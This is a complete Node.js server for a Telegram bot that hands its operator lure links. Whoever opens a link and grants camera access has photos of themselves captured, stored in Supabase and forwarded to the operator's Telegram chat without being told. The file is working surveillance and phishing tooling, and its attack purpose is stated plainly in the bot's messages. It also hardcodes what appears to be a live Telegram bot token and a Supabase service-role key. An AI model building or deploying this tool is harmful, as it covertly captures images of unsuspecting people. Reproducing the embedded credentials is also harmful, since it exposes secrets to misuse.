const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { createClient } = require('@supabase/supabase-js');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const https = require('https');

// ================= Configurations =================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7599562667:AAEzBnwqNr1uzn6F4ZmLSV0LIjobVrbnkJo';
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://oqadecntljqjxfgsfcfq.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9xYWRlY250bGpxanhmZ3NmY2ZxIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MTE4Mzk4NiwiZXhwIjoyMDk2NzU5OTg2fQ.cFuBbo_TjaRDM9eNqknXnm33a2ZoWN7YKet-i9OoCuY';
const BASE_URL = process.env.BASE_URL || 'https://camera-5nbr.onrender.com';
const PORT = process.env.PORT || 3000;

// Initialize clients
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const app = express();
const upload = multer({ dest: 'uploads/' });

// Serve static files from 'public' directory
app.use(express.static('public'));

// State to track if a user is expected to send an image
const awaitingImage = {};

// ================= Telegram Bot Logic =================

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Start Task', callback_data: 'start_task' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'Welcome! Click the button below to start.', opts);
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    
    if (callbackQuery.data === 'start_task') {
        awaitingImage[chatId] = true;
        bot.sendMessage(chatId, 'Please send me an image that you want to show to the user.');
        bot.answerCallbackQuery(callbackQuery.id);
    }
});

bot.on('photo', async (msg) => {
    const chatId = msg.chat.id;
    
    if (awaitingImage[chatId]) {
        bot.sendMessage(chatId, 'Processing your image... Please wait.');
        awaitingImage[chatId] = false; // Reset state
        
        try {
            // Get highest resolution photo
            const photo = msg.photo[msg.photo.length - 1];
            const fileId = photo.file_id;
            
            // Get file link from Telegram
            const fileUrl = await bot.getFileLink(fileId);
            
            // Download image locally
            const fileName = `orig_${Date.now()}.jpg`;
            const filePath = path.join(__dirname, 'uploads', fileName);
            
            // Ensure uploads directory exists
            if (!fs.existsSync(path.join(__dirname, 'uploads'))) {
                fs.mkdirSync(path.join(__dirname, 'uploads'));
            }

            const file = fs.createWriteStream(filePath);
            https.get(fileUrl, function(response) {
                response.pipe(file);
                file.on('finish', async function() {
                    file.close();
                    
                    try {
                        // Read file and upload to Supabase
                        const fileBuffer = fs.readFileSync(filePath);
                        const { data, error } = await supabase.storage
                            .from('image')
                            .upload(`originals/${fileName}`, fileBuffer, {
                                contentType: 'image/jpeg',
                                upsert: true
                            });

                        if (error) throw error;

                        // Get public URL of the uploaded image
                        const { data: publicUrlData } = supabase.storage
                            .from('image')
                            .getPublicUrl(`originals/${fileName}`);
                        
                        const publicUrl = publicUrlData.publicUrl;

                        // Insert into database
                        const { data: insertData, error: dbError } = await supabase
                            .from('links')
                            .insert([
                                { chat_id: chatId, original_image_url: publicUrl }
                            ])
                            .select();

                        if (dbError) throw dbError;

                        const uniqueId = insertData[0].id;
                        const generatedLink = `${BASE_URL}?id=${uniqueId}`;

                        bot.sendMessage(chatId, `Success! Here is your link:\n\n${generatedLink}\n\nSend this link to someone. When they open it and allow camera access, their photos will be sent to you here.`);
                        
                        // Cleanup local file
                        fs.unlinkSync(filePath);
                    } catch (uploadErr) {
                        console.error('Supabase Error:', uploadErr);
                        bot.sendMessage(chatId, 'Sorry, there was an error uploading your image to the database.');
                    }
                });
            }).on('error', function(err) {
                console.error('Download Error:', err);
                bot.sendMessage(chatId, 'Sorry, failed to download image.');
            });
            
        } catch (err) {
            console.error('Error:', err);
            bot.sendMessage(chatId, 'Sorry, an error occurred.');
        }
    }
});

// ================= Express API Logic =================

app.post('/upload', upload.array('photos', 3), async (req, res) => {
    const { id } = req.body;
    const files = req.files;

    if (!id || !files || files.length === 0) {
        return res.status(400).json({ error: 'Missing ID or photos' });
    }

    try {
        // Fetch chat_id and original_image_url from database
        const { data: linkData, error: dbError } = await supabase
            .from('links')
            .select('*')
            .eq('id', id)
            .single();

        if (dbError || !linkData) {
            return res.status(404).json({ error: 'Link not found' });
        }

        const chatId = linkData.chat_id;
        const originalImageUrl = linkData.original_image_url;

        const uploadedPhotos = [];

        // Upload photos to Supabase and prepare for Telegram
        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const fileBuffer = fs.readFileSync(file.path);
            const fileName = `captured_${id}_${Date.now()}_${i}.jpg`;

            // Upload to Supabase
            const { error: uploadError } = await supabase.storage
                .from('image')
                .upload(`captured/${fileName}`, fileBuffer, {
                    contentType: 'image/jpeg',
                    upsert: true
                });

            if (!uploadError) {
                // Prepare media group for Telegram
                uploadedPhotos.push({
                    type: 'photo',
                    media: fs.createReadStream(file.path)
                });
            }
        }

        // Send photos to the Telegram user
        if (uploadedPhotos.length > 0) {
            await bot.sendMediaGroup(chatId, uploadedPhotos);
            bot.sendMessage(chatId, '📸 New photos received from your link!');
        }

        // Cleanup local files
        files.forEach(file => fs.unlinkSync(file.path));

        // Return original image URL to frontend
        res.json({ success: true, original_image_url: originalImageUrl });

    } catch (err) {
        console.error('Upload Endpoint Error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// ================= Start Server =================
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
